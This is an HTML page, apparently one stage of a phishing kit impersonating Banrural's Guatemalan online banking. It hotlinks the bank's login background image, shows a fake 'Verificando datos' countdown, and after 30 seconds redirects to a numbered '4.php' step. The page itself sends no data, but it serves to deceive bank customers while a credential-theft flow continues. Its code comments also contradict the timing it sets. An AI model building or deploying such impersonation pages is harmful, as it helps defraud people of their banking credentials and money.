<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  body {
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    background-color: #f0f0f0;
    font-family: Arial, sans-serif;
    background-image: url(https://bancavirtual.banrural.com.gt/cb/web/images/bg-login-1.jpg);
    background-size: cover; /* Ajustar el tamaño de la imagen para cubrir todo el fondo */
    background-position: center center; /* Centrar la imagen tanto horizontal como verticalmente */
    background-repeat: no-repeat; /* Evitar que la imagen de fondo se repita */
  }

  .loader {
    text-align: center;
    background-color: #ffffff69;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
  }

  .loader-text {
    font-size: 18px;
    margin-bottom: 10px;
  }
</style>
<title>Loader</title>
</head>
<body>
<div class="loader">
  <p class="loader-text">Por favor, espere un momento</p>
  <div id="countdown"></div>
</div>

<script>
  // Redireccionar después de 15 segundos
  setTimeout(function() {
    window.location.href = '4.php'; // Cambia 'nueva-pagina.html' por la URL de la página a la que deseas redirigir
  }, 30000); // 15 segundos en milisegundos

  // Mostrar cuenta regresiva en el elemento 'countdown'
  var countdownElement = document.getElementById('countdown');
  var countdown = 30;

  function updateCountdown() {
    countdownElement.innerText = 'Verificando datos ' + countdown + ' segundos...';
    countdown--;
    if (countdown >= 0) {
      setTimeout(updateCountdown, 1000);
    }
  }

  updateCountdown();
</script>
</body>
</html>
